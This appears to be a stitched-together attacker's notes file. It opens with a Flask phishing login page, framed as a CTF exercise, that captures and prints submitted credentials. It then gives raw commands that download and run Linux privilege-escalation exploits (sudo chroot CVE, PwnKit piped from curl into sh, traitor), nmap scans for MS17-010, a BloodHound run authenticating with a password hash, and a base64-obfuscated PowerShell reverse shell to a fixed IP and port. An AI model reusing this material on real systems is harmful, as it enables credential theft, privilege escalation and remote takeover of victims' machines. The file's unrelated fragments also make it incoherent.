 from flask import Flask, request, render_template_string, redirect, url_for
import os

app = Flask(__name__)

# Flag for the CTF (normally this would be in /home/Admin)
FLAG = os.getenv('FLAG', 'CTF{simulated_flag_for_education}')

# Simple database to store "captured" credentials (in memory only)
captured_credentials = []

@app.route('/')
def phishing_page():
    return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Secure Login Portal</title>
            <style>
                body { font-family: Arial, sans-serif; background-color: #f5f5f5; }
                .login-box { 
                    width: 300px; padding: 20px; background: white; 
                    margin: 100px auto; box-shadow: 0 0 10px rgba(0,0,0,0.1);
                    border-radius: 5px;
                }
                input { width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box; }
                button { 
                    background-color: #4CAF50; color: white; padding: 10px 15px; 
                    border: none; width: 100%; cursor: pointer;
                }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h2>Company Secure Login</h2>
                <form method="POST" action="/login">
                    <label for="username">Username:</label>
                    <input type="text" id="username" name="username" required>
                    
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password" required>
                    
                    <button type="submit">Sign In</button>
                </form>
            </div>
        </body>
        </html>
    ''')

@app.route('/login', methods=['GET', 'POST'])  # Now accepts both GET and POST
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # Store the captured credentials
        captured_credentials.append({'username': username, 'password': password})
        print(f"Captured credentials: {username}:{password}")
        
        # Show failed login message with potential flag
        return render_template_string('''
            <h2>Login Failed</h2>
            <p>Your credentials were incorrect. Please try again.</p>
            <a href="/">Go back</a>
            
            <!-- Hidden flag for the CTF challenge -->
            {% if username == "Admin" %}
                <div style="display:none;">Flag: {{ flag }}</div>
            {% endif %}
        ''', flag=FLAG)
    else:
        # Handle GET request by showing the login form
        return redirect(url_for('phishing_page'))

@app.route('/admin')
def admin():
    # This would be the real admin page in a real scenario
    return f"Admin panel - Flag: {FLAG}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    
wget https://raw.githubusercontent.com/pr0v3rbs/CVE-2025-32463_Chwoot/refs/heads/main/sudo-chwoot.sh

exploit exp2: sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"

wget https://github.com/liamg/traitor/releases/download/v0.0.14/traitor-amd64

Searching for kernel vulnerabilities, traitor




@Infinity7054
----
WIndows scanning network vulnerable machines: nmap -Pn -n -sT -p 88,135,137,389,445,1433,3389 -sV -sC --open -iL list-of-machines.txt | OR: nmap -Pn -sV -p445 --script smb-vuln-ms17-010 -v victim_ip

bloodhound collector: bloodhound-python -c All -d 'sandbox.local' -u 'administrator' --hashes 'aad34...' -ns 10.10.0.4

db_nmap -p 1433 -sV target.ine.local -sC -O — osscan-guess


powershell -e "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAIAAxADAAMAAuADEAMAAwAC4ANwA1AC4AMgA0ADIAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
